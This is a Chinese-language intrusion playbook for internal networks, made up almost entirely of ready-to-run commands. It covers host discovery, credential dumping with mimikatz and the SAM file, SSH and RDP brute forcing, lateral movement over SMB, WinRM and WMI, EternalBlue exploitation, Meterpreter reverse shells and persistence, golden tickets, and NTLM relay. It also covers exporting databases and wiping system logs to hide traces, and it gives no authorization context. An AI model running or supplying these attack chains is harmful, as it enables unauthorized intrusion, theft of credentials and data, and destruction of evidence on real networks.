# 内网渗透实战手册 2025

## 一、内网信息收集（5分钟）

### 1. 基础信息收集
```bash
# 系统信息
uname -a
cat /etc/os-release
hostname
id
whoami

# 网络信息
ip addr
ip route
cat /etc/resolv.conf
netstat -antlp
ss -antlp

# 进程和服务
ps aux
systemctl list-units --type=service
```

### 2. 内网扫描（快速定位高价值目标）
```bash
# C段扫描（发现存活主机）
for i in {1..254}; do
    timeout 1 bash -c "ping -c 1 192.168.1.$i > /dev/null 2>&1 && echo 192.168.1.$i" &
done | sort -u

# 端口扫描（定位关键服务）
nmap -sn 192.168.1.0/24
nmap -p 22,80,443,3306,6379,27017,3389,445,5985,5986 192.168.1.0/24 --open

# 服务识别
nmap -sV -sC -p- 192.168.1.100
```

### 3. 域环境识别
```bash
# Windows域环境
net view /domain
net group "Domain Admins" /domain
nltest /domain_trusts

# Linux域环境
realm list
getent passwd
getent group
```

## 二、横向移动技术（2025最新）

### 1. 凭证复用（最高效）
```bash
# 收集凭证
# Linux
cat ~/.ssh/id_rsa
cat ~/.bash_history | grep -i "password\|passwd\|ssh"
env | grep -i "pass\|key\|token"

# Windows
type C:\Users\*\AppData\Roaming\Microsoft\Credentials\*
type C:\Windows\System32\config\SAM
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```

### 2. SSH密钥复用
```bash
# 批量测试SSH密钥
for ip in $(cat ips.txt); do
    ssh -i id_rsa -o ConnectTimeout=3 root@$ip "hostname" 2>/dev/null && echo "[+] $ip"
done

# SSH密码复用
hydra -L users.txt -P passwords.txt ssh://192.168.1.0/24 -t 4
```

### 3. SMB横向（Windows域）
```bash
# 枚举共享
smbclient -L //192.168.1.100 -N
smbmap -H 192.168.1.100

# 凭证复用
smbclient //192.168.1.100/C$ -U domain/user%password
psexec.py domain/user:password@192.168.1.100

# 批量测试
crackmapexec smb 192.168.1.0/24 -u user -p password --shares
```

### 4. WinRM横向（5985/5986）
```bash
# 测试WinRM
crackmapexec winrm 192.168.1.0/24 -u user -p password

# 执行命令
evil-winrm -i 192.168.1.100 -u user -p password
winrs -r:http://192.168.1.100:5985 -u:user -p:password "whoami"
```

### 5. RDP横向（3389）
```bash
# 批量测试RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.100
xfreerdp /u:user /p:password /v:192.168.1.100

# 凭证复用
rdesktop -u user -p password 192.168.1.100
```

### 6. WMI横向（135/445）
```bash
# WMI执行
wmic /node:192.168.1.100 /user:user /password:password process call create "cmd.exe /c whoami"

# Impacket工具
wmiexec.py domain/user:password@192.168.1.100
```

### 7. 数据库横向
```bash
# MySQL
mysql -h 192.168.1.100 -u root -p'password' -e "SELECT VERSION();"

# MSSQL
mssqlclient.py domain/user:password@192.168.1.100
sqlcmd -S 192.168.1.100 -U user -P password -Q "SELECT @@VERSION"

# Redis
redis-cli -h 192.168.1.100 -a password
```

### 8. 容器/K8s横向
```bash
# K8s API
kubectl --server=https://192.168.1.100:6443 --insecure-skip-tls-verify get pods -A

# Docker
docker -H tcp://192.168.1.100:2375 ps
```

## 三、MSF实战用法（2025）

### 1. MSF基础设置
```bash
# 启动MSF
msfconsole

# 数据库初始化
msfdb init
msfdb start

# 连接数据库
db_connect -y ~/.msf4/database.yml
```

### 2. 内网扫描模块
```bash
# 端口扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,3306,3389,445
run

# SMB枚举
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SSH爆破
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run
```

### 3. 漏洞利用模块
```bash
# 选择exploit
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit

# 自动选择payload
exploit -z  # 后台运行
```

### 4. Meterpreter后渗透
```bash
# 基础信息
sysinfo
getuid
getprivs
ps
netstat

# 凭证收集
hashdump
load kiwi
kiwi_cmd "privilege::debug"
kiwi_cmd "sekurlsa::logonpasswords"

# 持久化
run persistence -X -i 60 -p 4444 -r 10.10.10.10
run metsvc

# 横向移动
psexec -u user -p password 192.168.1.101
```

### 5. MSF路由（内网穿透）
```bash
# 添加路由
run autoroute -s 192.168.1.0/24
route add 192.168.1.0 255.255.255.0 1

# 通过路由扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set ROUTE_THROUGH_SESSION 1
run

# SOCKS代理
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run

# 配置proxychains
# /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 192.168.1.100
```

### 6. MSF自动化脚本
```bash
# 资源文件
cat > /tmp/auto_exploit.rc <<EOF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit -z
run autoroute -s 192.168.1.0/24
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set ROUTE_THROUGH_SESSION 1
run
EOF

msfconsole -r /tmp/auto_exploit.rc
```

### 7. MSF Handler（接收反弹）
```bash
# 启动handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; exploit -j"

# 生成payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

## 四、域环境攻击（AD）

### 1. BloodHound（攻击路径）
```bash
# 收集数据
SharpHound.exe -c All,GPOLocalGroup -d domain.local --zipfilename bh.zip

# 上传到Kali
python3 -m http.server 8000
# Windows下载: certutil -urlcache -f http://10.10.10.10:8000/bh.zip bh.zip

# 导入分析
neo4j start
bloodhound
```

### 2. Kerberoasting
```bash
# 获取SPN
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# 爆破
hashcat -m 13100 hashes.txt wordlist.txt
```

### 3. AS-REP Roasting
```bash
# 获取AS-REP
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# 爆破
hashcat -m 18200 asrep.txt wordlist.txt
```

### 4. 黄金票据
```bash
# 获取krbtgt hash
mimikatz "lsadump::dcsync /domain:domain.local /user:krbtgt"

# 生成黄金票据
mimikatz "kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /user:administrator /id:500 /ptt"
```

### 5. NTLM Relay
```bash
# 启动中继
ntlmrelayx.py -tf targets.txt -smb2support -socks

# 通过SOCKS代理
proxychains smbclient //192.168.1.100/C$ -U "" -N
```

## 五、权限提升（提权）

### 1. Linux提权
```bash
# 内核漏洞
searchsploit linux kernel
uname -a
# 编译exp并执行

# SUID
find / -perm -4000 2>/dev/null
# 利用已知SUID漏洞

# Sudo滥用
sudo -l
# 利用sudo权限执行命令
```

### 2. Windows提权
```bash
# 系统信息
systeminfo
wmic qfe list

# 查找提权exp
windows-exploit-suggester.py --database 2025-01-01-mssb.xls --systeminfo systeminfo.txt

# 常见提权
# PrintSpoofer, JuicyPotato, RoguePotato
```

## 六、数据收集与导出

### 1. 敏感文件
```bash
# Linux
find / -name "*.key" -o -name "*.pem" -o -name "*password*" 2>/dev/null
find / -name ".env" -o -name "config.php" 2>/dev/null

# Windows
dir /s /b C:\*.key
dir /s /b C:\*.pem
dir /s /b C:\*password*
```

### 2. 数据库导出
```bash
# MySQL
mysqldump -u root -p database_name > dump.sql

# MSSQL
sqlcmd -S server -U user -P password -Q "SELECT * FROM users" -o output.txt
```

## 七、痕迹清除

### 1. Linux
```bash
# 清除历史
history -c
rm ~/.bash_history
unset HISTFILE

# 清除日志
shred -u /var/log/*
```

### 2. Windows
```powershell
# 清除事件日志
wevtutil el | ForEach-Object {wevtutil cl "$_"}

# 清除痕迹
Clear-EventLog -LogName Application,Security,System
```

## 八、实战流程（30分钟完整链路）

```bash
# 1. 信息收集（5分钟）
ip addr
netstat -antlp
nmap -sn 192.168.1.0/24

# 2. 定位高价值目标（5分钟）
nmap -p 445,3389,5985 192.168.1.0/24 --open

# 3. 凭证复用（5分钟）
crackmapexec smb 192.168.1.0/24 -u user -p password --shares

# 4. 横向移动（10分钟）
psexec.py domain/user:password@192.168.1.100
# 或MSF exploit

# 5. 权限提升（5分钟）
# 根据系统版本选择提权exp

# 6. 数据收集（5分钟）
# 收集凭证、敏感文件、数据库

# 7. 扩大战果（持续）
# 继续横向，直到域控
```

## 九、常用工具清单

```bash
# 内网扫描
nmap, masscan, naabu

# 横向移动
impacket, crackmapexec, psexec, wmiexec

# 域攻击
BloodHound, Mimikatz, Rubeus, Kerbrute

# C2框架
MSF, Cobalt Strike, Sliver, Havoc

# 代理工具
chisel, frp, ngrok, reGeorg

# 凭证工具
hashcat, john, LaZagne, mimikatz
```
